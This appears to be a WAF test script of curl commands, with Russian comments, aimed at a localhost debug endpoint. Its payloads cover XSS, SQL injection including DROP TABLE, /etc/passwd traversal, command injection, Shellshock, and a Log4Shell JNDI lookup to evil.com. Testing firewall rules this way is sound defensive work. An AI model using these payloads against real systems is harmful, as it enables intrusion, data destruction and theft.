# 1. Классический XSS (очень часто блокируется)
curl.exe -H "X-Forwarded-For: 8.8.8.8" "http://localhost/debug/?q=%3Cscript%3Ealert(1)%3C/script%3E"
curl.exe -H "X-Forwarded-For: 1.1.1.1" "http://localhost/debug/?q=%3Cimg%20src=x%20onerror=alert(1)%3E"
curl.exe -G "http://localhost/debug/" --data-urlencode "q=<svg/onload=alert(1)>" -H "X-Forwarded-For: 208.67.222.222"

# 2. SQL-инъекции (самые популярные тесты)
curl.exe -H "X-Forwarded-For: 45.33.32.156" "http://localhost/debug/?id=1%27%20OR%20%271%27=%271"
curl.exe -H "X-Forwarded-For: 185.220.101.1" "http://localhost/debug/?id=1%20union%20select%201,2,3--"
curl.exe -H "X-Forwarded-For: 91.121.81.18" "http://localhost/debug/?id=1;%20DROP%20TABLE%20users--"
curl.exe -H "X-Forwarded-For: 103.21.244.0" "http://localhost/debug/?id=-1/**/OR/**/1=1"

# 3. Path traversal / LFI
curl.exe -H "X-Forwarded-For: 31.13.71.36" "http://localhost/debug/?file=../../../../etc/passwd"
curl.exe -H "X-Forwarded-For: 104.244.42.1" "http://localhost/debug/?page=../../../etc/passwd%00"
curl.exe -H "X-Forwarded-For: 5.188.10.10" "http://localhost/debug/../../../../../etc/passwd"

# 4. Command injection / RCE-подобные попытки
curl.exe -H "X-Forwarded-For: 66.249.66.1" "http://localhost/debug/?cmd=%3Bcat+/etc/passwd"
curl.exe -H "X-Forwarded-For: 77.88.55.80" "http://localhost/debug/?p=%7Cwhoami"
curl.exe -H "X-Forwarded-For: 93.184.216.34" "http://localhost/debug/?ip=127.0.0.1%3Bid"

# 5. Java / Spring4Shell / Log4Shell
curl.exe -H "X-Forwarded-For: 193.148.18.1" "http://localhost/debug/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=test"
curl.exe -H "X-Forwarded-For: 185.199.108.153" "http://localhost/debug/?jndi=${jndi:ldap://evil.com/a}"

# 6. Очень простые, но часто срабатывающие тесты
curl.exe -H "X-Forwarded-For: 89.248.165.16" "http://localhost/debug/?test=1%20or%20sleep(5)"
curl.exe -H "X-Forwarded-For: 176.31.120.166" "http://localhost/debug/?a=../../"
curl.exe -H "User-Agent: () { :;}; /bin/bash -c 'echo vulnerable'" -H "X-Forwarded-For: 198.51.100.77" "http://localhost/debug/"

# 7. POST-атаки (очень важно тестировать body)
# SQLi в теле POST
curl.exe -X POST "http://localhost/debug/" -H "X-Forwarded-For: 203.0.113.45" -d "username=admin' OR '1'='1&password=test"

# JSON SQLi
curl.exe -X POST "http://localhost/debug/" -H "Content-Type: application/json" -H "X-Forwarded-For: 54.182.90.12" -d "{\"id\": \"1; DROP TABLE users --\"}"

# XSS в теле POST
curl.exe -X POST "http://localhost/debug/" -H "X-Forwarded-For: 172.67.155.22" -d "text=<script>alert(document.cookie)</script>"

# 8. Закодированные / обфусцированные варианты
curl.exe -H "X-Forwarded-For: 162.159.36.1" "http://localhost/debug/?q=%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"
curl.exe -H "X-Forwarded-For: 138.68.74.27" "http://localhost/debug/?id=1%20uNiOn%20sElEcT%201,2,3--"

# 9. Тест на срабатывание конкретного правила
curl.exe -H "X-Forwarded-For: 95.216.15.1" "http://localhost/debug/?test=1/**/union/**/select/**/1,2,3"
curl.exe -H "User-Agent: Mozilla/5.0 (compatible; sqlmap/1.0)" -H "X-Forwarded-For: 185.220.102.8" "http://localhost/debug/"

# 10. Проверка на блокировку больших/странных заголовков
curl.exe -H "X-Forwarded-For: 192.0.2.123, evil.com" "http://localhost/debug/"
curl.exe -H "Referer: http://evil.com/%3Cscript%3Ealert(1)%3C/script%3E" -H "X-Forwarded-For: 51.38.201.99" "http://localhost/debug/"
